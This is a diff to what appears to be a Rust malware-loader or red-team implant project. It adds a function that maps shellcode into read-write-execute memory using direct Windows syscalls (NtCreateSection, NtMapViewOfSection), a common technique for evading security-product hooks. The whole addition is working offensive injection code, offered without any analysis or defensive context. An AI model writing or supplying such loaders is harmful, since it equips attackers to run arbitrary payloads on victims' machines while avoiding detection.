@@ -41,3 +41,64 @@ pub fn inject_default_local(bytes_to_load: &[u8]) -> Result<*mut c_void, i32> {
         Ok(base_address)
     }
 }
+
+// =======================================================================================================
+// INJECTION METHOD: MAPPING LOCAL
+// =======================================================================================================
+
+#[cfg(feature = "InjectionMappingLocal")]
+use std::ptr::copy_nonoverlapping;
+
+#[cfg(feature = "InjectionMappingLocal")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "InjectionMappingLocal")]
+pub fn inject_mapping_local(shellcode: &[u8]) -> Result<*mut c_void, String> {
+    unsafe {
+        let mut section_handle: *mut c_void = std::ptr::null_mut();
+        let mut max_size: u64 = shellcode.len() as u64;
+
+        // Create a section object using NtCreateSection
+        let status = syscall!(
+            "NtCreateSection",
+            &mut section_handle as *mut *mut c_void,
+            0x000F001Fu32, // SECTION_ALL_ACCESS
+            std::ptr::null::<c_void>(),
+            &mut max_size as *mut u64,
+            0x40u32, // PAGE_EXECUTE_READWRITE
+            0x8000000u32, // SEC_COMMIT
+            std::ptr::null::<c_void>()
+        );
+
+        // Map the section into the process's address space using NtMapViewOfSection
+        let mut base_address: *mut c_void = std::ptr::null_mut();
+        let mut view_size: usize = shellcode.len();
+        
+        // NtMapViewOfSection parameters
+        let status = syscall!(
+            "NtMapViewOfSection",
+            section_handle,
+            -1isize, // Current process
+            &mut base_address as *mut *mut c_void,
+            0usize,
+            0usize,
+            std::ptr::null_mut::<u64>(),
+            &mut view_size as *mut usize,
+            2u32, // ViewUnmap
+            0u32,
+            0x40u32 // PAGE_EXECUTE_READWRITE
+        );
+
+        // Copy the shellcode into the mapped memory
+        copy_nonoverlapping(
+            shellcode.as_ptr(),
+            base_address as *mut u8,
+            shellcode.len(),
+        );
+
+        // Close the section handle
+        syscall!("NtClose", section_handle);
+
+        Ok(base_address)
+    }
+}
